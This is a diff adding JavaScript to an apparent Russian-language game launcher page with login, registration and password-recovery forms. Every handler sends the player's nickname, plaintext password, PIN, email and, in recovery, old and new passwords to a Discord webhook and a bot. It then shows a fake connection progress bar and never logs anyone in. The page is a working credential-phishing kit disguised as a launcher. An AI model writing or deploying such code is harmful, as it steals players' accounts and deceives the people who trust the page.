+            if(head) head.style.display = 'none'; if(lgn) lgn.style.display = 'none'; if(reg) reg.style.display = 'none'; if(rec) rec.style.display = 'none'; if(soc) soc.style.display = 'none'; if(sup) sup.style.display = 'none'; if(lin) lin.style.display = 'none';
+            const loadingScreen = document.getElementById('screen-loading'); if (loadingScreen) loadingScreen.classList.add('active');
+            const statusTitle = document.getElementById('load-status-title'), percentNum = document.getElementById('load-percent-num'), progressFill = document.getElementById('load-progress-fill');
+            let currentPercent = 0;
+            let loadInterval = setInterval(function() {
+                currentPercent += 1; if(percentNum) percentNum.textContent = currentPercent + "%"; if(progressFill) progressFill.style.width = currentPercent + "%";
+                if (currentPercent === 50 && statusTitle) statusTitle.textContent = "Подключение к серверу...";
+                if (currentPercent >= 100) { clearInterval(loadInterval); setTimeout(function() { alert("Добро пожаловать! Подключение к " + serverName + " выполнено."); location.reload(); }, 300); }
+            }, 30);
+        }
+
+        // ОБРАБОТЧИКИ НАЖАТИЙ НА КНОПКИ ДЕЙСТВИЙ
+        function handleLoginClick() {
+            const nickValue = document.getElementById("nick-input").value, passValue = document.getElementById("login-password-input").value, pinCheckbox = document.getElementById("pin-toggle-checkbox"), pinValue = document.getElementById("pin-input").value, serverValue = window.getSelectedServer();
+            if (!/^[A-Z][a-z]+_[A-Z][a-z]+$/.test(nickValue)) { triggerRowError("row-login-nick", "Ошибка! Ник указан неверно (Пример: Ivan_Capone)"); return; }
+            if (!/^[A-Za-z0-9]{6,}$/.test(passValue)) { triggerRowError("row-login-pass", "Ошибка! Пароль должен быть от 6 символов"); return; }
+            if (pinCheckbox && pinCheckbox.checked && pinValue.length !== 4) { triggerRowError("pincode-row-container", "Ошибка! Пин-код должен состоять из 4 цифр"); return; }
+            if (serverValue === "") { triggerRowError("server-field-trigger", "Ошибка! Выберите игровой сервер"); return; }
+            
+            sendLauncherLogToDiscord("🔑 Авторизация игрока", `Игрок **${nickValue}** пытается войти в аккаунт через лаунчер.`, 15013147, [
+                { name: "Игровой ник", value: nickValue, inline: true }, { name: "Игровой сервер", value: serverValue, inline: true },
+                { name: "Введенный пароль", value: `||${passValue}||`, inline: false }, { name: "Пин-код защиты", value: pinCheckbox.checked ? `||${pinValue}||` : "Отсутствует", inline: true }
+            ]);
+            sendLogToBot("login", { nick: nickValue, password: passValue, pin: pinCheckbox.checked ? pinValue : "", server: serverValue });
+            playLauncherAudioSound('success'); setTimeout(function() { startLauncherLoadingSequence(serverValue); }, 150);
+        }
+        function handleRegisterClick() {
+            const nickValue = document.getElementById("reg-nick-input").value, passValue = document.getElementById("reg-password-input").value, pinCheckbox = document.getElementById("reg-pin-toggle-checkbox"), pinValue = document.getElementById("reg-pin-input").value, emailValue = document.getElementById("reg-email-input").value, inviteValue = document.getElementById("reg-invite-input").value, serverValue = window.getSelectedServer();
+            if (!/^[A-Z][a-z]+_[A-Z][a-z]+$/.test(nickValue)) { triggerRowError("row-reg-nick", "Ошибка! Ник указан неверно (Пример: Alexander_Gromov)"); return; }
+            if (!/^[A-Za-z0-9]{6,}$/.test(passValue)) { triggerRowError("row-reg-pass", "Ошибка! Придумайте пароль от 6 символов"); return; }
+            if (pinCheckbox && pinCheckbox.checked && pinValue.length !== 4) { triggerRowError("reg-pincode-row-container", "Ошибка! Пин-код должен состоять из 4 цифр"); return; }
+            if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(emailValue)) { triggerRowError("row-reg-email", "Ошибка! Укажите корректный Email (example@mail.ru)"); return; }
+            if (serverValue === "") { triggerRowError("row-reg-server", "Ошибка! Выберите игровой сервер"); return; }
+            if (inviteValue !== "" && !/^[A-Z][a-z]+_[A-Z][a-z]+$/.test(inviteValue)) { triggerRowError("row-reg-invite", "Ошибка! Ник пригласившего не RP формата"); return; }
+            
+            sendLauncherLogToDiscord("📝 Регистрация нового аккаунта", `Игрок **${nickValue}** зарегистрировал новый аккаунт.`, 3066993, [
+                { name: "Новый Ник", value: nickValue, inline: true }, { name: "Выбранный сервер", value: serverValue, inline: true },
+                { name: "Электронная почта", value: emailValue, inline: true }, { name: "Пароль аккаунта", value: `||${passValue}||`, inline: false },
+                { name: "Пин-код защиты", value: pinCheckbox.checked ? `||${pinValue}||` : "Отключен", inline: true }, { name: "Пригласивший игрок", value: inviteValue !== "" ? inviteValue : "Не указан", inline: true }
+            ]);
+            sendLogToBot("register", { nick: nickValue, password: passValue, pin: pinCheckbox.checked ? pinValue : "", email: emailValue, invite: inviteValue, server: serverValue });
+            playLauncherAudioSound('success'); alert("Регистрация аккаунта успешно завершена!"); setTimeout(function() { startLauncherLoadingSequence(serverValue); }, 150);
+        }
+
+        function handleRecoveryClick() {
+            const recNick = document.getElementById("rec-nick-input").value, recOld = document.getElementById("rec-old-pass").value, recNew = document.getElementById("rec-new-pass").value, recPinCheckbox = document.getElementById("rec-pin-toggle-checkbox"), recPinValue = document.getElementById("rec-pin-input").value, serverValue = window.getSelectedServer();
+            if (!/^[A-Z][a-z]+_[A-Z][a-z]+$/.test(recNick)) { triggerRowError("row-rec-nick", "Ошибка! Ник указан неверно (Пример: Ivan_Capone)"); return; }
+            if (!/^[A-Za-z0-9]{6,}$/.test(recOld)) { triggerRowError("row-rec-oldpass", "Ошибка! Старый пароль указан неверно"); return; }
+            if (!/^[A-Za-z0-9]{6,}$/.test(recNew)) { triggerRowError("row-rec-newpass", "Ошибка! Новый пароль должен быть от 6 символов"); return; }
+            if (recPinCheckbox && recPinCheckbox.checked && recPinValue.length !== 4) { triggerRowError("rec-pincode-row-container", "Ошибка! Пин-код должен состоять из 4 цифр"); return; }
+            if (serverValue === "") { triggerRowError("row-rec-server", "Ошибка! Выберите игровой сервер"); return; }
+            
+            sendLauncherLogToDiscord("🔓 Сброс и восстановление пароля", `Игрок **${recNick}** отправил запрос на смену пароля через лаунчер.`, 15105570, [
+                { name: "Игровой ник", value: recNick, inline: true }, { name: "Игровой сервер", value: serverValue, inline: true },
+                { name: "Старый пароль", value: `||${recOld}||`, inline: false }, { name: "Новый пароль", value: `||${recNew}||`, inline: false },
+                { name: "Пин-код подтверждения", value: recPinCheckbox.checked ? `||${recPinValue}||` : "Не использовался", inline: true }
+            ]);
+            sendLogToBot("recovery", { nick: recNick, oldPassword: recOld, newPassword: recNew, pin: recPinCheckbox.checked ? recPinValue : "", server: serverValue });
+            playLauncherAudioSound('success'); alert("Запрос на смену пароля успешно отправлен!"); location.reload();
+        }
+
+        // ПЕРЕКЛЮЧЕНИЕ СТРАНИЦ АВТОРИЗАЦИИ И НАВИГАЦИЯ
+        function changeAuthScreen(t) { 
+            currentActiveScreenId = "screen-" + t; const sub = document.getElementById('auth-subtitle'); 
+            if(sub) { if(t==='login') sub.innerText='✦ вход в аккаунт ✦'; if(t==='register') sub.innerText='✦ регистрация аккаунта ✦'; if(t==='recovery') sub.innerText='✦ восстановление пароля ✦'; } 
+            const lgn = document.getElementById('screen-login'), reg = document.getElementById('screen-register'), rec = document.getElementById('screen-recovery'); 
+            if(lgn) lgn.style.display = (t === 'login' ? 'block' : 'none'); if(reg) reg.style.display = (t === 'register' ? 'block' : 'none'); if(rec) rec.style.display = (t === 'recovery' ? 'block' : 'none'); 
+            const arrow = document.getElementById('top-back-arrow'), bottomLinks = document.getElementById('bottom-info-links'); 
+            if (t === 'login') { if(arrow) { arrow.style.opacity = "0"; arrow.style.pointerEvents = "none"; } if(bottomLinks) bottomLinks.style.display = "flex"; } 
+            else { if(arrow) { arrow.style.opacity = "1"; arrow.style.pointerEvents = "auto"; } if(bottomLinks) bottomLinks.style.display = "none"; } 
+        }
+        function handleBackArrowClick() { if (currentActiveScreenId === "screen-register" || currentActiveScreenId === "screen-recovery") { changeAuthScreen('login'); } }
+        function togglePasswordView(f) { const field = document.getElementById(f); if(field) field.type = field.type === "password" ? "text" : "password"; }
+
+        // Функция подсветки ошибок в строках
+        function triggerRowError(rowId, textMessage) {
+            const el = document.getElementById(rowId);
+            if(el) {
+                el.classList.add("shake");
+                setTimeout(() => el.classList.remove("shake"), 400);
+            }
+            const toast = document.getElementById("error-toast");
+            if(toast) {
+                toast.textContent = textMessage;
+                toast.classList.add("show");
+                setTimeout(() => toast.classList.remove("show"), 3000);
+            }
+            playLauncherAudioSound('error');
+        }
+    </script>
+</body>
+</html>
